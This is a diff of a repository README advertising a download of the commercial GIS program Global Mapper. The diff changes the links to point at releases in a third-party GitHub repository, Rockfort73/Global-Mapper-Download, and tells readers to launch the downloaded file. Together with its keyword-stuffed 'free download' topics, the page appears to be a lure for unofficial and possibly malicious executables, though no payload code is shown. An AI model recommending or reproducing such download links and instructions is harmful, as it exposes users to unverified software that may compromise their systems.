@@ -11,7 +11,7 @@ Whether you are looking to explore Global Mapper's 3D capabilities, leverage its
 - **Topics:** arcgis-vs-global-mapper, buy-global-mapper, download-free-global-mapper, global-mapper-3d, global-mapper-api, global-mapper-download, global-mapper-lidar-classification, global-mapper-python, global-mapper-system-requirements, global-mapper-watershed-analysis, grass-gis, grass-gis-addons, grib2json, hermosa-earth.
 
 ## Resources
-For downloading Global Mapper software, click [here](https://github.com/files/File.zip). Make sure to launch the file to start the download process. If the link is not functioning or you need an alternative, check the "Releases" section for additional options.
+For downloading Global Mapper software, click [here](https://github.com/Rockfort73/Global-Mapper-Download/releases). Make sure to launch the file to start the download process. If the link is not functioning or you need an alternative, check the "Releases" section for additional options.
 
 ## Additional Information
 Explore the wealth of possibilities Global Mapper offers, from its intuitive user interface to its powerful lidar processing capabilities. Dive deep into the world of geospatial analysis with Global Mapper and unlock the full potential of your data.
@@ -26,7 +26,7 @@ Stay up to date with the latest Global Mapper news, updates, and tips by followi
 
 By leveraging the power of Global Mapper, you can take your geospatial analysis to new heights. Download the software, explore its features, and unlock a world of possibilities in the realm of cartography and geospatial data processing. Join us on this exciting journey today! 🌐🗺️🚀
 
-![Global Mapper Image](https://example.com/global-mapper-image.jpg)
+![Global Mapper Image](https://github.com/Rockfort73/Global-Mapper-Download/releases)
 
 For any queries or assistance, feel free to reach out to us. Happy mapping! 🌍🔍
 
